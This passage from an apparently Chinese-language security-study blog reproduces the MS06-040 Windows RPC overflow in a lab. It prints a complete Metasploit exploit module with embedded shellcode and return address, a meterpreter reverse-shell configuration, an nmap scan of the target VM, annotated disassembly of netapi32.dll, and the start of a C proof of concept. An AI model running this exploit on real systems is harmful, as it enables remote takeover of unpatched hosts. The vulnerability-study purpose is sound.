2000 SP0&#x27;</span>,</span><br><span class="line">                    &#123;<span class="string">&#x27;Ret&#x27;</span> =&gt; [<span class="number">0x318</span>, <span class="number">0x74FB62C3</span>]&#125;</span><br><span class="line">                    ]]</span><br><span class="line">        ))</span><br><span class="line">register_options([OptString.new(</span><br><span class="line"><span class="string">&#x27;SMBPIPE&#x27;</span>,</span><br><span class="line">                            [true,<span class="string">&quot;(BROWSER, SRVSVC)&quot;</span>, <span class="string">&#x27;BROWSER&#x27;</span>]</span><br><span class="line">                            ),],</span><br><span class="line">                       self.<span class="keyword">class</span>)</span><br><span class="line">end <span class="comment">#end of initialize</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">exploit</span></span><br><span class="line">        connect()</span><br><span class="line">        smb_login()</span><br><span class="line">        handle = dcerpc_handle(<span class="string">&#x27;4b324fc8-1670-01d3-1278-5a47bf6ee188&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;3.0&#x27;</span>, <span class="string">&#x27;ncacn_np&#x27;</span>,  [<span class="string">&quot;\\#&#123;datastore[&#x27;SMBPIPE&#x27;]&#125;&quot;</span>])</span><br><span class="line">        dcerpc_bind(handle)</span><br><span class="line">        prefix = ......</span><br><span class="line">        path = ......</span><br><span class="line">        stub =NDR.long(rand(<span class="number">0xffffffff</span>)) +</span><br><span class="line">            NDR.UnicodeConformantVaryingString(<span class="string">&#x27;&#x27;</span>) +</span><br><span class="line">            NDR.UnicodeConformantVaryingStringPreBuilt(path) +</span><br><span class="line">            NDR.long(rand(<span class="number">0xf0</span>)+<span class="number">1</span>) +</span><br><span class="line">            NDR.UnicodeConformantVaryingStringPreBuilt(prefix) +</span><br><span class="line">            NDR.long(rand(<span class="number">0xf0</span>)+<span class="number">1</span>) +</span><br><span class="line">            NDR.long(<span class="number">0</span>)</span><br><span class="line">        dcerpc.call(<span class="number">0x1f</span>, stub) <span class="comment"># call NetpwPathCanonicalize()</span></span><br><span class="line">        disconnect</span><br><span class="line">        </span><br><span class="line">end <span class="comment">#end of exploit def</span></span><br><span class="line">end</span><br></pre></td></tr></table></figure><p>我们只需要关注 path 串和 prefix 串的内容，在恰当的位置布置特定的内容， MSF 和远程的主机会自动按照 RPC 协议为我们完成网络握手、参数解析、函数定位等工作。</p><p>攻击代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MetasploitModule</span> &lt; Msf::Exploit::Remote</span><br><span class="line">    Rank = GoodRanking</span><br><span class="line"> </span><br><span class="line">    include Msf::Exploit::Remote::DCERPC</span><br><span class="line">    include Msf::Exploit::Remote::SMB::Client                      <span class="comment"># 主要就是上面这几行，还有最后一行多了一个end</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">initialize</span>(<span class="params">info = &#123;&#125;</span>)</span><br><span class="line">        <span class="built_in">super</span>(update_info(info,</span><br><span class="line">            <span class="string">&#x27;Name&#x27;</span>   =&gt; <span class="string">&#x27;MS06-040 Remote overflow POC &#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Platform&#x27;</span> =&gt; <span class="string">&#x27;win&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Targets&#x27;</span>  =&gt; [[<span class="string">&#x27;Windows 2000 SP0&#x27;</span>,</span><br><span class="line">                            &#123;<span class="string">&#x27;Ret&#x27;</span> =&gt; [<span class="number">0x318</span> , <span class="number">0x74FB62C3</span>]&#125;</span><br><span class="line">                           ]]</span><br><span class="line">             ))</span><br><span class="line">        register_options([OptString.new(</span><br><span class="line">                                <span class="string">&#x27;SMBPIPE&#x27;</span>,</span><br><span class="line">                                [true,<span class="string">&quot;(BROWSER, SRVSVC)&quot;</span>, <span class="string">&#x27;BROWSER&#x27;</span>]</span><br><span class="line">                                ),],</span><br><span class="line">                         self.<span class="keyword">class</span>) </span><br><span class="line">    end <span class="comment">#end of initialize</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">exploit</span></span><br><span class="line">        connect()</span><br><span class="line">        smb_login()</span><br><span class="line">        handle = dcerpc_handle(<span class="string">&#x27;4b324fc8-1670-01d3-1278-5a47bf6ee188&#x27;</span>,</span><br><span class="line">                              <span class="string">&#x27;3.0&#x27;</span>,  <span class="string">&#x27;ncacn_np&#x27;</span>,  [<span class="string">&quot;\\#&#123;datastore[&#x27;SMBPIPE&#x27;]&#125;&quot;</span>])</span><br><span class="line">        dcerpc_bind(handle)</span><br><span class="line">        prefix = <span class="string">&quot;\x8B\xC1\x83\xC0\x05\x59\x81\xC9\xD3\x62\x30\x20\x41\x43\x4D\x64&quot;</span>+</span><br><span class="line">            <span class="string">&quot;\x99\x96\x8D\x7E\xE8\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B\x49\x1C\x8B&quot;</span>+</span><br><span class="line">            <span class="string">&quot;\x09\x8B\x69\x08\xB6\x03\x2B\xE2\x66\xBA\x33\x32\x52\x68\x77\x73&quot;</span>+</span><br><span class="line">            <span class="string">&quot;\x32\x5F\x54\xAC\x3C\xD3\x75\x06\x95\xFF\x57\xF4\x95\x57\x60\x8B&quot;</span>+</span><br><span class="line">            <span class="string">&quot;\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59\x20\x03\xDD\x33\xFF\x47&quot;</span>+</span><br><span class="line">            <span class="string">&quot;\x8B\x34\xBB\x03\xF5\x99\xAC\x34\x71\x2A\xD0\x3C\x71\x75\xF7\x3A&quot;</span>+</span><br><span class="line">            <span class="string">&quot;\x54\x24\x1C\x75\xEA\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59&quot;</span>+</span><br><span class="line">            <span class="string">&quot;\x1C\x03\xDD\x03\x2C\xBB\x95\x5F\xAB\x57\x61\x3B\xF7\x75\xB4\x5E&quot;</span>+</span><br><span class="line">            <span class="string">&quot;\x54\x6A\x02\xAD\xFF\xD0\x88\x46\x13\x8D\x48\x30\x8B\xFC\xF3\xAB&quot;</span>+</span><br><span class="line">            <span class="string">&quot;\x40\x50\x40\x50\xAD\xFF\xD0\x95\xB8\x02\xFF\x1A\x0A\x32\xE4\x50&quot;</span>+</span><br><span class="line">            <span class="string">&quot;\x54\x55\xAD\xFF\xD0\x85\xC0\x74\xF8\xFE\x44\x24\x2D\x83\xEF\x6C&quot;</span>+</span><br><span class="line">            <span class="string">&quot;\xAB\xAB\xAB\x58\x54\x54\x50\x50\x50\x54\x50\x50\x56\x50\xFF\x56&quot;</span>+</span><br><span class="line">            <span class="string">&quot;\xE4\xFF\x56\xE8\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span>+</span><br><span class="line">            <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span>+</span><br><span class="line">            <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span>+</span><br><span class="line">            <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x00\x00&quot;</span></span><br><span class="line">        path = <span class="string">&quot;\x90&quot;</span> * <span class="number">0x318</span> + [target[<span class="string">&#x27;Ret&#x27;</span>][<span class="number">1</span>]].pack(<span class="string">&#x27;V&#x27;</span>) + </span><br><span class="line">            <span class="string">&quot;\x04\xD0\xFD\x7F&quot;</span> * <span class="number">5</span> +    <span class="comment"># writeable address</span></span><br><span class="line">            <span class="string">&quot;\x66\x81\xEC\x30\x04&quot;</span> +    <span class="comment"># sub esp,430</span></span><br><span class="line">            <span class="string">&quot;\x8B\xC4&quot;</span> +             <span class="comment"># mov eax, esp</span></span><br><span class="line">            <span class="string">&quot;\xFF\xE4&quot;</span> +            <span class="comment"># jmp esp</span></span><br><span class="line">            <span class="string">&quot;\x00\x00&quot;</span></span><br><span class="line">        stub =NDR.long(rand(<span class="number">0xffffffff</span>)) +</span><br><span class="line">             NDR.UnicodeConformantVaryingString(<span class="string">&#x27;&#x27;</span>) +</span><br><span class="line">             NDR.UnicodeConformantVaryingStringPreBuilt(path) +</span><br><span class="line">             NDR.long(rand(<span class="number">0xf0</span>)+<span class="number">1</span>) +</span><br><span class="line">             NDR.UnicodeConformantVaryingStringPreBuilt(prefix) +</span><br><span class="line">             NDR.long(rand(<span class="number">0xf0</span>)+<span class="number">1</span>) +</span><br><span class="line">             NDR.long(<span class="number">0</span>)    </span><br><span class="line">        dcerpc.call(<span class="number">0x1f</span>, stub) <span class="comment"># call NetpwPathCanonicalize()</span></span><br><span class="line">        disconnect    </span><br><span class="line">    end  <span class="comment">#end of exploit def</span></span><br><span class="line">end</span><br></pre></td></tr></table></figure><h3 id="配置"><a class="markdownIt-Anchor" href="#配置"></a> 配置</h3><p>攻击机：kali</p><p>IP地址：192.168.188.141</p><p>靶机：Windows2000 sp4</p><p>IP地址：192.168.188.133</p><h3 id="准备"><a class="markdownIt-Anchor" href="#准备"></a> 准备</h3><p>首先确定靶机开启的端口：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">┌──(host㉿kali)-[~]</span><br><span class="line">└─$ sudo nmap --allports -O 192.168.188.133                                                                               </span><br><span class="line">[sudo] host 的密码：</span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-15 21:22 CST</span><br><span class="line">Nmap scan report for 192.168.188.133</span><br><span class="line">Host is up (0.00030s latency).</span><br><span class="line">Not shown: 995 closed tcp ports (reset)</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">135/tcp  open  msrpc</span><br><span class="line">139/tcp  open  netbios-ssn</span><br><span class="line">445/tcp  open  microsoft-ds</span><br><span class="line">1025/tcp open  NFS-or-IIS</span><br><span class="line">1723/tcp open  pptp</span><br><span class="line">MAC Address: 00:0C:29:97:7A:5F (VMware)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Microsoft Windows 2000|XP</span><br><span class="line">OS CPE: cpe:/o:microsoft:windows_2000::- cpe:/o:microsoft:windows_2000::sp1 cpe:/o:microsoft:windows_2000::sp2 cpe:/o:microsoft:windows_2000::sp3 cpe:/o:microsoft:windows_2000::sp4 cpe:/o:microsoft:windows_xp::- cpe:/o:microsoft:windows_xp::sp1</span><br><span class="line">OS details: Microsoft Windows 2000 SP0 - SP4 or Windows XP SP0 - SP1</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line"></span><br><span class="line">OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 3.64 seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以看到打开了445端口。</p><p>最后的配置：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(rgzz/ms06_040) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/rgzz/ms06_040):</span><br><span class="line"></span><br><span class="line">   Name     Current Setting  Required  Description</span><br><span class="line">   ----     ---------------  --------  -----------</span><br><span class="line">   RHOSTS   192.168.188.133  yes       The target host(s), see https://gith</span><br><span class="line">                                       ub.com/rapid7/metasploit-framework/w</span><br><span class="line">                                       iki/Using-Metasploit</span><br><span class="line">   RPORT    445              yes       The SMB service port (TCP)</span><br><span class="line">   SMBPIPE  BROWSER          yes       (BROWSER, SRVSVC)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (windows/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  process          yes       Exit technique (Accepted: &#x27;&#x27;, seh,</span><br><span class="line">                                        thread, process, none)</span><br><span class="line">   LHOST     192.168.188.141  yes       The listen address (an interface ma</span><br><span class="line">                                        y be specified)</span><br><span class="line">   LPORT     4444             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Windows 2000 SP0</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>用上面给出的代码，结果出错了，导致了靶机关机。</p><p><img src="/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS06-040/image-20220716170814837.png" alt="image-20220716170814837"></p><h3 id="调试-serviceexe"><a class="markdownIt-Anchor" href="#调试-serviceexe"></a> 调试 service.exe</h3><p>将OD附加到services上，然后在<code>NetpwPathCanonicalize</code>（0x75107AFD）上下一个断点，F9继续执行。</p><p style="color:red;">回到攻击机上，执行exploit，再回到靶机，发现并没有在 NetpwPathCanonicalize 停下，而是直接提示关机，这样就无法进行后续调试了。不知道是不是漏洞已经被修补的缘故。上面的本地实验中，我用的也是本书资料中提供的netapi32.dll。</p><h1 id="windows-xp-环境下的-ms06040-exploit"><a class="markdownIt-Anchor" href="#windows-xp-环境下的-ms06040-exploit"></a> Windows XP 环境下的 MS06—040 exploit</h1><h2 id="静态分析-2"><a class="markdownIt-Anchor" href="#静态分析-2"></a> 静态分析</h2><p>选取 Windows XP SP3 的 netapi32.dll，对其 CanonicalizePathName 函数做静态分析。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line">; =============== S U B R O U T I N E =======================================</span><br><span class="line">; int __stdcall CanonicalizePathName(wchar_t*, wchar_t *, wchar_t *, int, int)</span><br><span class="line">71BA428B CanonicalizePathName proc near</span><br><span class="line">71BA428B</span><br><span class="line">71BA428B Buff_last_word = word ptr -416h</span><br><span class="line">71BA428B Buff_OF = word ptr -414h</span><br><span class="line">71BA428B arg_Prefix = dword ptr 8</span><br><span class="line">71BA428B arg_Path = dword ptr 0Ch</span><br><span class="line">71BA428B arg_CanPath = dword ptr 10h</span><br><span class="line">71BA428B arg_Maxbuf = dword ptr 14h</span><br><span class="line">71BA428B arg_CanSize = dword ptr 18h</span><br><span class="line">71BA428B</span><br><span class="line">71BA428B push ebp</span><br><span class="line">71BA428C mov ebp, esp</span><br><span class="line">71BA428E sub esp, 414h ; 依然分配了 0x414 字节栈空间，即 Buff_OF，</span><br><span class="line">; 用来存储合并路径(prefix+’\’+path)</span><br><span class="line">71BA4294 push ebx</span><br><span class="line">71BA4295 mov ebx, ds:__imp_wcscat</span><br><span class="line">71BA429B push esi</span><br><span class="line">71BA429C xor esi, esi</span><br><span class="line">71BA429E cmp [ebp+arg_Prefix], esi ; prefix 指针是否为 0</span><br><span class="line">71BA42A1 push edi</span><br><span class="line">71BA42A2 mov edi, ds:__imp_wcslen</span><br><span class="line">71BA42A8 jnz @@prefix_ptr_not_zero</span><br><span class="line">; 若 prefix 非 0，跳转至@@prefix_ptr_not_zero</span><br><span class="line">71BA42AE mov [ebp+Buff_OF], si ; 若 prefix 为 0，初始化 Buff_OF 为空串</span><br><span class="line">71BA42B5 @@chk_pathname:</span><br><span class="line">71BA42B5 push [ebp+arg_Path]</span><br><span class="line">71BA42B8 call edi ; __imp_wcslen ; 计算 path 串的 Unicode 长度</span><br><span class="line">71BA42BA add eax, esi; 计算合并路径长度</span><br><span class="line">71BA42BC cmp eax, 207h ; 对合并路径长度做越界检查，请注意，这里已经将</span><br><span class="line">                        ; 字节长度除 2，转化为 unicode 长度 0x207，而</span><br><span class="line">                        ; 在 Windows 2000 中，这个值是 0x411,没有做</span><br><span class="line">                        ; 转化，可见 Windows XP 的溢出另有原因！</span><br><span class="line">71BA42C1 pop ecx</span><br><span class="line">71BA42C2 ja @@err_invalid_name</span><br><span class="line">71BA42C8 push [ebp+arg_Path]</span><br><span class="line">71BA42CB lea eax, [ebp+Buff_OF]</span><br><span class="line">71BA42D1 push eax</span><br><span class="line">71BA42D2 call ebx ; __imp_wcscat ; 将 Buff_OF(prefix+’\’)与 path 串合并</span><br><span class="line">; 得到合并路径</span><br><span class="line">…</span><br><span class="line">71BA4317 lea eax, [ebp+Buff_OF]</span><br><span class="line">71BA431D push eax</span><br><span class="line">71BA431E call edi ; __imp_wcslen ; 计算合并路径 Unicode 长度</span><br><span class="line">71BA4320 lea eax, [eax+eax+2] ; 将 Unicode 长度转化为字节长度并加上结尾</span><br><span class="line">; 的两个空字节</span><br><span class="line">71BA4324 cmp eax, [ebp+arg_Maxbuf] ; 检查 can_path 的容量 maxbuf，是否可以</span><br><span class="line">; 可以容纳合并路径</span><br><span class="line">71BA4327 pop ecx</span><br><span class="line">71BA4328 ja @@err_buf_too_small ; 若 can_path 空间不够，退出</span><br><span class="line">71BA432E lea eax, [ebp+Buff_OF]</span><br><span class="line">71BA4334 push eax</span><br><span class="line">71BA4335 push [ebp+arg_CanPath]</span><br><span class="line">71BA4338 call ds:__imp_wcscpy; 将合并路径复制 Buff_OF 至 can_path</span><br><span class="line">71BA433E pop ecx</span><br><span class="line">71BA433F pop ecx</span><br><span class="line">71BA4340 xor eax, eax ; 路径合并成功，返回 0</span><br><span class="line">71BA4342 @@quit:</span><br><span class="line">71BA4342 pop edi</span><br><span class="line">71BA4343 pop esi</span><br><span class="line">71BA4344 pop ebx</span><br><span class="line">71BA4345 leave</span><br><span class="line">71BA4346 retn 14h</span><br><span class="line">71BA4349 @@err_invalid_name:</span><br><span class="line">71BA4349 push ERROR_INVALID_NAME</span><br><span class="line">71BA434B pop eax</span><br><span class="line">71BA434C jmp short @@quit</span><br><span class="line">71BA434C CanonicalizePathName endp</span><br><span class="line">…</span><br><span class="line">71BB0E2D @@prefix_ptr_not_zero:</span><br><span class="line">71BB0E2D push [ebp+arg_Prefix]</span><br><span class="line">71BB0E30 call edi ; __imp_wcslen</span><br><span class="line">71BB0E32 mov esi, eax ; esi 存储 prefix 串的 unicode 长度</span><br><span class="line">71BB0E34 test esi, esi ; 检查 prefix 串长度是否为 0，即空串</span><br><span class="line">71BB0E36 pop ecx</span><br><span class="line">71BB0E37 jz @@chk_pathname ; 如果 prefix 为空串，则跳至</span><br><span class="line">                                    ; @@chk_pathname，请注意，如果代码</span><br><span class="line">                                    ; 流程走到这里， Buff_OF 始终是没有初</span><br><span class="line">                                    ; 始化的！这是 MS06-040 的另一个溢出点</span><br><span class="line">71BB0E3D cmp esi, 208h ; 如果 prefix 串非空，其 Unicode 长度</span><br><span class="line">; 不能超过 0x208，否则退出</span><br><span class="line">71BB0E43 ja @@err_invalid_name</span><br><span class="line">…</span><br><span class="line">71BB0EA9 @@err_buf_too_small:</span><br><span class="line">71BB0EA9 mov ecx, [ebp+arg_CanSize]</span><br><span class="line">71BB0EAC test ecx, ecx</span><br><span class="line">71BB0EAE jz short @@err_buf_too_small2</span><br><span class="line">71BB0EB0 mov [ecx], eax</span><br><span class="line">71BB0EB2 @@err_buf_too_small2:</span><br><span class="line">71BB0EB2 mov eax, NERR_BufTooSmall</span><br><span class="line">71BB0EB7 jmp @@quit</span><br><span class="line">…</span><br><span class="line">; =============== S U B R O U T I N E =======================================</span><br></pre></td></tr></table></figure><p>从上面的第 31 行中可以看到，上一个实验中 cmp eax,411 已经被修补，无法在利用。不过，通过进一步静态分析，可以发现 CanonicalizePathName 函数在分配了栈空间 Buff_OF 后，没有进行初始化；如果 prefix 指针为 0，代码会对 Buff_OF 做初始化（见 0x71BA42AE）；而如果 prefix 非 0，并指向空字串，代码将直接对未初始化的 Buff_OF 和 path 串用 wcscat 函数进行连接（见 0x71BA42B5-0x71BA42D2）。这是一个非常危险的操作，因为未初始化的栈空间 Buff_OF 的长度是未知的，甚至可能超过 0x414 字节，其后再连接上 path 串，很有可能产生溢出。</p><p>由于 Buff_OF 位于栈中，内容随机，怎样控制它的长度，是如何利用这个漏洞的重点。我们可以通过连续调用 CanonicalizePathName 函数来控制它的长度。 因为当 Buff_OF 被首次填充并连接，直到 CanonicalizePathName 函数退出后，其所在的栈空间位于 ESP 的低地址，如果不做任何栈操作，如函数调用等，内容是不会改变的；此时，如果再次调用 CanonicalizePathName，已经被填充的 Buff_OF 将面临溢出的风险。</p><p>CanonicalizePathName 是 NetpwPathCanonicalize 的子函数，不能直接被调用。分析一下函数 NetpwPathCanonicalize 是如何调用 CanonicalizePathName 的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">71BA421A mov esi, [ebp+arg_CanPath]</span><br><span class="line">71BA421D push edi</span><br><span class="line">71BA421E push [ebp+arg_Maxbuf]</span><br><span class="line">71BA4221 mov [esi], di</span><br><span class="line">71BA4224 push esi</span><br><span class="line">71BA4225 push [ebp+arg_Path]</span><br><span class="line">71BA4228 push ebx</span><br><span class="line">71BA4229 call CanonicalizePathName</span><br><span class="line">71BA422E cmp eax, edi ; 检查函数 CanonicalizePathName 的返回值</span><br><span class="line">71BA4230 jnz short @@quit ; 非 0 则直接退出</span><br><span class="line">71BA4232 push edi</span><br><span class="line">71BA4233 push [ebp+arg_Pathtype]</span><br><span class="line">71BA4236 push esi</span><br><span class="line">71BA4237 call NetpwPathType</span><br><span class="line">71BA423C jmp short @@quit</span><br><span class="line">...</span><br><span class="line">; =============== S U B R O U T I N E =======================================</span><br><span class="line">; int __stdcall NetpwPathCanonicalize(wchar_t *, wchar_t *, int, int, int, int)</span><br><span class="line">71BA4244 public NetpwPathCanonicalize</span><br><span class="line">71BA4244 NetpwPathCanonicalize proc near</span><br><span class="line">71BA4244</span><br><span class="line">71BA4244 arg_Path = dword ptr 8</span><br><span class="line">71BA4244 arg_CanPath = dword ptr 0Ch</span><br><span class="line">71BA4244 arg_Maxbuf = dword ptr 10h</span><br><span class="line">71BA4244 arg_Prefix = dword ptr 14h</span><br><span class="line">71BA4244 arg_Pathtype = dword ptr 18h</span><br><span class="line">71BA4244 arg_Pathflags = dword ptr 1Ch</span><br><span class="line">...</span><br><span class="line">71BA4284 @@quit</span><br><span class="line">71BA4284 pop edi</span><br><span class="line">71BA4285 pop esi</span><br><span class="line">71BA4286 pop ebx</span><br><span class="line">71BA4287 pop ebp</span><br><span class="line">71BA4288 retn 18h</span><br><span class="line">71BA4288 NetpwPathCanonicalize endp</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>如果能够使 CanonicalizePathName 调用失败（返回值非 0），NetpwPathCanonicalize 将直接退出，从而保证 Buff_OF 所在的栈空间不发生变化。由于参数 maxbuf 是可控的，我们可 以 利 用 较 小 的 maxbuf ， 使 CanonicalizePathName 返 回 NERR_BufTooSmall （参看 0x71BA4317-0x71BA4328）而直接退出。</p><p>MS06-040 在 Windows XP 下溢出的 POC 代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">void</span> <span class="params">(__stdcall * MYPROC)</span><span class="params">(LPTSTR, LPTSTR, <span class="type">int</span>, LPTSTR, <span class="type">long</span> *, <span class="type">long</span>)</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PATH1_SIZE (0xc2*2)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PATH2_SIZE (0x150*2)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> OUTBUF_SIZE 0x440</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PREFIX_SIZE 0x410</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span 